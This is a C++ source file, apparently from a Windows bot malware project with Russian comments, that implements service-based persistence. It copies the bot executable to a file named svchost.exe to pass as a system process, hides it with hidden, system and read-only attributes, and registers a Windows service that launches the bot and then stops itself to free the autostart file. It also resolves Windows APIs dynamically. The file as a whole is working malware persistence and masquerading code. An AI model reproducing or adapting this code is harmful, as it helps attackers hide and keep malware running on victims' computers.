#include "main.h"
#include "service.h"
#include "core\file.h"
#include "core\debug.h"
#include "core\reestr.h"
#include "core\service.h"

namespace Service
{

static SERVICE_STATUS serviceStatus; 
static SERVICE_STATUS_HANDLE serviceStatusHandle;

bool GetFileNameService( StringBuilder& fileName )
{
	StringBuilderStack<MAX_PATH> path;
//	if( Path::GetCSIDLPath( /*CSIDL_AP//PDATA*/ /*CSIDL_WINDOWS*/ CSIDL_SYSTEM, path ) )
//	{
//		Path::Combine( fileName, path, _CS_("com"), _CS_("svchost.exe") );
//		return true;
//	}
	if( Config::GetBotFolder(path) )
	{
		Path::Combine( fileName, path, _CS_("svchost.exe") );
		return true;
	}
	return false;
}

bool Copy( const StringBuilder& srcFile )
//bool Copy( const Mem::Data& data )
{
	StringBuilderStack<MAX_PATH> fileName;
	if( !GetFileNameService(fileName) )
		return false;
	if( File::IsExists(fileName) ) //если файл существует, то снимаем все атрибуты, чтобы перезаписался
		File::SetAttributes( fileName, FILE_ATTRIBUTE_NORMAL );
	if( !File::Copy( srcFile, fileName ) )
//	if( !File::Write( fileName, data ) )
	{
		DbgMsg( "Не удалось скопировать '%s' -> '%s', ошибка %d", srcFile.c_str(), fileName.c_str(), API(KERNEL32, GetLastError)() );
//		DbgMsg( "Не удалось скопировать в '%s', ошибка %d", fileName.c_str(), API(KERNEL32, GetLastError)() );
		return false;
	}
	File::SetAttributes( fileName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM );
	DbgMsg( "Скопировали '%s' -> '%s'", srcFile.c_str(), fileName.c_str() );
//	DbgMsg( "Скопировали в '%s'", fileName.c_str() );
	return true;
}

bool Install( const StringBuilder& srcFile, bool copyFile )
{
	DbgMsg( "Инсталяция бота как сервиса, исходный файл '%s'", srcFile.c_str() );
	StringBuilderStack<MAX_PATH> fileName;
	if( !GetFileNameService(fileName) )
		return false;
	DbgMsg( "Имя файла сервиса '%s'", fileName.c_str() );

	if( copyFile )
		Copy( srcFile );
	else
		DbgMsg( "Файл сервиса уже был скопирован" );

	StringBuilderStack<256> nameService, displayName;
	if( !CreateNameService( nameService, displayName ) )
		return false;
	DbgMsg( "Имя сервиса '%s', '%s'", nameService.c_str(), displayName.c_str() );
	bool ret = Create( fileName, nameService, displayName );
	if( ret )
	{
		Str::Copy( Config::fileNameBot, sizeof(Config::fileNameBot), fileName, fileName.Len() );
		Str::Copy( Config::nameService, sizeof(Config::nameService), nameService.c_str(), nameService.Len() );
	}
	return ret;
}

static void WINAPI ServiceControlHandler( DWORD request )
{
	if( request == SERVICE_CONTROL_STOP || request == SERVICE_CONTROL_SHUTDOWN )
	{
		serviceStatus.dwWin32ExitCode = 0;
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		API(ADVAPI32, SetServiceStatus)( serviceStatusHandle, &serviceStatus );
		DbgMsg( "Сервис остановлен" );
		return;
	}
}

//главная функция сервиса
//сервис используется только для запуска бота, после того как бот запущен
//сервис через несколько секунд останавливается, чтобы освободить файл автозагрузки
static void WINAPI ServiceMain(int argc, char** argv)
{
	DbgMsg( "ServiceMain" );
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
	serviceStatus.dwCurrentState = SERVICE_START_PENDING; 
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	serviceStatus.dwWin32ExitCode = 0; 
	serviceStatus.dwServiceSpecificExitCode = 0; 
	serviceStatus.dwCheckPoint = 0; 
	serviceStatus.dwWaitHint = 0; 

	StringBuilderStack<64> nameService;
	StringBuilderStack<MAX_PATH> currPath;
	Path::GetStartupExe(currPath);
	currPath.Lower();
	GetNameService( nameService, currPath );

	serviceStatusHandle = API(ADVAPI32, RegisterServiceCtrlHandlerA)(nameService, (LPHANDLER_FUNCTION)ServiceControlHandler); 
	if( !serviceStatusHandle )
	{ 
		return; 
	} 

	serviceStatus.dwCurrentState = SERVICE_RUNNING; 
	API(ADVAPI32, SetServiceStatus)( serviceStatusHandle, &serviceStatus );
	DbgMsg( "Сервис '%s' запущен", nameService );
#ifdef NOT_EXPLORER
		StartBot();
#else
		StartBotApart();
#endif
	int n = 0;
	//через 5с отключаем сервис
	while( serviceStatus.dwCurrentState == SERVICE_RUNNING )
	{
		Delay(1000);
		n++;
		if( n > 5 )
		{
			SC_HANDLE scmanager = API(ADVAPI32, OpenSCManagerA)(NULL, NULL, SERVICE_STOP);
			SC_HANDLE service = API(ADVAPI32, OpenServiceA)( scmanager, nameService, SERVICE_STOP );
			API(ADVAPI32, ControlService)( service, SERVICE_CONTROL_STOP, &serviceStatus);
		}
	}
	DbgMsg( "Вышли из ServiceMain" );
}

bool Start()
{
	SERVICE_TABLE_ENTRY serviceTable[2];
	StringBuilderStack<64> nameService;
	StringBuilderStack<MAX_PATH> currPath;
	Path::GetStartupExe(currPath);
	currPath.Lower();
	if( !GetNameService( nameService, currPath ) )
		return false;
	Str::Copy( Config::nameService, sizeof(Config::nameService), nameService, nameService.Len() );
	
	serviceTable[0].lpServiceName = nameService;
	serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)ServiceMain;
	serviceTable[1].lpServiceName = 0;
	serviceTable[1].lpServiceProc = 0;

	if( API(ADVAPI32, StartServiceCtrlDispatcherA)(serviceTable) )
	{
		return true;
	}
	DbgMsg( "Сервис бота не запустился, ошибка %08x", API(KERNEL32, GetLastError)() );
	return false;
}

bool IsService( const StringBuilder& fileName )
{
	StringBuilderStack<MAX_PATH> path;
	GetFileNameService(path);
	if( path == fileName )
		return true;
	return false;
}

bool DeleteWithFile( const StringBuilder& name, bool delFile )
{
	StringBuilder fileName;
	Service::GetFileName( name, fileName );
	DbgMsg( "Имя файла сервиса %s", fileName.c_str() );
	Service::Delete(name);
	return File::DeleteHard(fileName);
}

}
